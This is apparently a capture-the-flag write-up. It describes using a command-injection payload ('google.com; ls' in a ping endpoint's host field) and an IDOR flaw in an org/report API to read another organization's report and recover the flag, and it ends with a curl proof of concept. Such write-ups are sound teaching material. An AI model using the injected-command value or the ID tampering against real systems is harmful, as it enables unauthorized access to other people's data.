# Vulnerability

1. Missing API authorization: The Swagger UI and API endpoints are publicly accessible without proper authorization checks.
2. IDOR: Backend does not verify and check whether the authenticated user is authorized to access the requested org_id and report_id or not. By changing these IDs in the request URL, a user can access reports belonging to another organization. 

# Extraction

In swagger, I executed this API `https://ctf.seoeh.ir/api/diag/ping` with this body:
```
{
  "host": "google.com; ls"
}
```

and found a directory called `reports` which contained two reports:
```
{
  "output": "report_1.txt\nreport_2.txt"
}
```

Which I just had access to `report_1.txt` in `https://ctf.seoeh.ir/reports`. So I started searching for a method to access `report_2.txt`.  

In swagger I found an API : 
```
GET
/api/orgs/{org_id}/reports/{report_id}
```

Using `org_id = 1` and `report_id = 1` the response of API would be: 
```
{
  "title": "Q3 Financial Summary",
  "secret_note": "Decoy: nothing interesting here."
}
```

and because of IDOR Vulnerability explained above if we change the report_id to 2 ( which we normally should not have access to it ) and also the org_id to 2 ( which is not related to our role and we should not have access to it ) the response would be:
```
{
  "title": "Globex Internal Audit",
  "secret_note": FLAG
}
```

And flag is found.


# PoC

```
curl -s 'https://ctf.seoeh.ir/api/orgs/2/reports/2' | jq -r '.secret_note'
```